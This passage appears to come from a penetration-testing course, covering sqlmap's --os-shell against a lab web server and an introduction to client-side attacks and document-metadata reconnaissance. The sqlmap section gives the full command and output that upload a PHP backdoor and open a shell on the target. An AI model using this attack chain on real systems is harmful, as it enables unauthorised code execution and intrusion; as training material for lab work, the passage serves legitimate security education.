### 10.3 Exploiting Time-Based Blind SQL Injection

When dealing with a time-based blind SQL injection (SQLi) vulnerability, the process of fetching the entire database's table can be quite slow. However, with patience and persistence, we can eventually obtain all users' hashed credentials.

Another core feature of `sqlmap` is the `--os-shell` parameter, which provides us with a full interactive shell. Due to the generally high latency of time-based blind SQLi, it is not ideal for interacting with a shell. Therefore, we will use a UNION-based SQLi example instead.

#### Steps to Exploit the Vulnerability

1. **Intercept the POST Request:**
   - First, we need to intercept the POST request via Burp Suite and save it as a local text file on our Kali VM.
   - The intercepted POST request looks like this:

     ```http
     POST /search.php HTTP/1.1
     Host: 192.168.50.19
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 9
     Origin: http://192.168.50.19
     Connection: close
     Referer: http://192.168.50.19/search.php
     Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
     Upgrade-Insecure-Requests: 1
     item=test
     ```

2. **Invoke sqlmap:**
   - Next, we can invoke `sqlmap` with the `-r` parameter, using our file containing the POST request as an argument. We also need to indicate which parameter is vulnerable, in this case, `item`.
   - Finally, we’ll include `--os-shell` along with the custom writable folder we found earlier.

     ```bash
     kali@kali:~$ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
     ```

3. **sqlmap Output:**
   - The `sqlmap` tool will start by parsing the HTTP request from the file and resuming the back-end DBMS.
   - It will test the connection to the target URL and confirm the injection point.
   - The back-end DBMS is identified as MySQL, and the web server operating system is determined to be Linux Ubuntu.
   - The tool will then prompt for the web application language, which in this case is PHP.

     ```bash
     [14:20:47] [INFO] parsing HTTP request from 'post'
     [14:20:47] [INFO] resuming back-end DBMS 'mysql'
     [14:20:47] [INFO] testing connection to the target URL
     [14:20:48] [INFO] the back-end DBMS is MySQL
     web server operating system: Linux Ubuntu
     web application technology: Apache 2.4.52
     back-end DBMS: MySQL >= 5.6
     [14:20:48] [INFO] going to use a web backdoor for command prompt
     [14:20:48] [INFO] fingerprinting the back-end DBMS operating system
     [14:20:48] [INFO] the back-end DBMS operating system is Linux
     which web application language does the web server support?
     [1] ASP
     [2] ASPX
     [3] JSP
     [4] PHP (default)
     > 4
     [14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
     [14:20:49] [INFO] retrieved web server absolute paths: '/var/www/html/search.php'
     [14:20:49] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via LIMIT 'LINES TERMINATED BY' method
     [14:20:50] [WARNING] unable to upload the file stager on '/var/www/html/tmp/'
     [14:20:50] [INFO] trying to upload the file stager on '/var/www/html/tmp/' via UNION method
     [14:20:50] [WARNING] expect junk characters inside the file as a leftover from UNION query
     [14:20:50] [INFO] the remote file '/var/www/html/tmp/tmpuqgek.php' is larger (713 B) than the local file '/tmp/sqlmapxkydllxb82218/tmp3d64iosz' (709B)
     [14:20:51] [INFO] the file stager has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpuqgek.php
     [14:20:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpbetmz.php
     [14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
     os-shell> id
     do you want to retrieve the command standard output? [Y/n/a] y
     command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
     os-shell> pwd
     do you want to retrieve the command standard output? [Y/n/a] y
     command standard output: '/var/www/html/tmp'
     ```

Once `sqlmap` confirms the vulnerability, it prompts for the language the web application is written in, which is PHP in this case. Next, `sqlmap` uploads the web shell to the specified web folder and returns the interactive shell, from which we can issue regular system commands.

### 10.4 Wrapping Up

In this module, we focused on identifying and enumerating SQL injection vulnerabilities. We explored the different payloads that can be leveraged to abuse these web application vulnerabilities and discovered how to achieve code execution manually. Finally, we learned how to automate the entire attack chain using `sqlmap`.

---

### 11. Client-side Attacks

In this learning module, we will cover the following learning units:
- Target Reconnaissance
- Exploiting Microsoft Office
- Abusing Windows Library Files

In penetration tests, we may be tasked by a client to breach the perimeter of their enterprise and obtain an initial foothold inside the network. With the traditional attack model, we would enumerate the client’s accessible machines and attempt to exploit their services. However, overcoming the perimeter by exploiting technical vulnerabilities has become increasingly rare and difficult, according to a report from Verizon. The report states that Phishing is the second largest attack vector used for breaching a perimeter, only surpassed by credential attacks.

Phishing often leverages client-side attacks. This type of attack works by delivering malicious files directly to users. Once they execute these files on their machine, we can get a foothold in the internal network. Client-side attacks often exploit weaknesses or functions in local software and applications such as browsers, operating system components, or office programs. To execute malicious code on the client’s system, we must often persuade, trick, or deceive the target user.

This concept of deception is an important one for us to consider as penetration testers. It raises the question: who exactly are we deceiving? Who are we trying to persuade? Client-side attacks allow us the opportunity to contemplate the vulnerabilities, biases, and fragility inherent to people, and not just computers or networks. This implies that to become the best possible attackers, we must not only be adept at technical skills like system administration and networking but also develop knowledge about human psychology, corporate culture, and social norms.

When we leverage client-side attacks in penetration tests, we must also consider the moral aspect of targeting users. Our goal should not only be to obtain code execution on their system but also to not overstep any ethical or legal boundaries, such as blackmailing employees or impersonating the police.

Since the client’s machine in an internal enterprise network is not usually a directly-accessible system and does not often offer externally-exposed services, this kind of attack vector is hard to mitigate and especially insidious. These kinds of attacks have encouraged the implementation of new defense paradigms.

Client-side attacks often use specific delivery mechanisms and payload combinations, including email attachments or links to malicious websites or files. We could even leverage more advanced delivery mechanisms such as USB Dropping or watering hole attacks.

Regardless of which delivery mechanism we choose, we must often deliver our payload to a target on a non-routable internal network, since client systems are rarely exposed externally. It has become increasingly difficult to deliver payloads via email due to spam filters, firewalls, and other security technologies scanning emails for links and attachments.

When choosing an attack vector and payload, we must first perform reconnaissance to determine the operating system of the target as well as any installed applications. This is a critical first step, as our payload must match the capability of the target. For example, if the target is running the Windows operating system, we can use a variety of client-side attacks like malicious JScript code executed through the Windows Script Host or .lnk shortcut files pointing to malicious resources. If the target has installed Microsoft Office, we could leverage documents with embedded malicious macros.

In this module, we’ll learn how to perform reconnaissance against a target, walk through exploitation scenarios involving malicious Microsoft Office documents, and leverage Windows Library files.

### 11.1 Target Reconnaissance

This learning unit covers the following learning objectives:
- Gather information to prepare client-side attacks
- Leverage client fingerprinting to obtain information

Before we execute a client-side attack, it’s crucial that we identify potential users to target and gather as much detailed information as possible about their operating system and installed application software. This helps us improve our chances of a successful attack. We can identify these users by browsing the company website and searching for points of contact or using passive information gathering techniques to find employees on social media.

Unlike traditional network reconnaissance performed against a target system, we do not often have a direct connection to the target of a client-side attack. Instead, we must use a more tailored and creative approach.

In this learning unit, we’ll explore these unique information-gathering techniques and discuss social engineering vectors designed to effectively enumerate the details of the target system.

### 11.1.1 Information Gathering

In this section, we’ll discuss various methods of enumerating a target’s installed software without interacting with the target machine. These techniques are best-suited for situations in which we have no way to interact with the target. Since we are not interacting with the target, we won’t alert monitoring systems or leave forensic traces of our inquiry.

One approach is to inspect the metadata tags of publicly-available documents associated with the target organization. Although this data can be manually sanitized, it often is not. These tags (categorized by tag groups) can include a variety of information about a document, including author, creation date, the name and version of the software used to create the document, operating system of the client, and much more.

In some cases, this information is stored explicitly in the metadata, and in some cases, it is inferred, but either way, the information can be quite revealing, helping us to build an accurate profile of software installed on clients in a target organization. Bear in mind that our findings may be outdated if we are inspecting older documents. In addition, different branches of the organization may use slightly different software.

Although this is a “hands-off” approach to data gathering, the trade-off is that we may not gather accurate information. Still, this approach is viable and effective.

Let’s review some sample documents so we can demonstrate metadata analysis. We’ll leverage some of the techniques we learned in the Information Gathering Module. For example, we can use the `site:example.com filetype:pdf` Google dork to find PDF files on a target’s web page. If we want to target a specific branch or location, we can add that information via keywords to narrow the results.

If we want to interact with the target’s web site, we could also use tools like `gobuster` with the `-x` parameter to search for specific file extensions on the target’s web site. This is noisy and will generate log entries on the target. We can also simply browse the target website for other specific information useful in a client-side attack, but we won’t delve into that subject in this section.

Let’s practice searching for and retrieving documents from the Mountain Vegetables website. We’ll open Firefox and navigate to `http://192.168.50.197`.

**Figure 164: Mountain Vegetables Single Page Application**

The text on the site states that the website is currently under development. Scrolling through the pages and hovering over buttons, we find a link to download a brochure.

**Figure 165: Download PDF Brochure**

Once we click "CURRENT," Firefox opens the document in a new tab where we can download it.

To display the metadata of any supported file, we can use `exiftool`. Let’s provide the arguments `-a` to display duplicated tags and `-u` to display unknown tags along with the filename `brochure.pdf`:

```bash
kali@kali:~$ cd Downloads
kali@kali:~/Downloads$ exiftool -a -u brochure.pdf
```

**Listing 211: Displaying the metadata for brochure.pdf**

This generated a lot of output. For us, the most important information includes the file creation date, last modified date, the author’s name, the operating system, and the application used to create the file.

The `Create Date` and `Modify Date` sections reveal the relative age of the document. Given that these dates are relatively recent (at the time of this writing), we have a high level of trust that this information is current and relevant.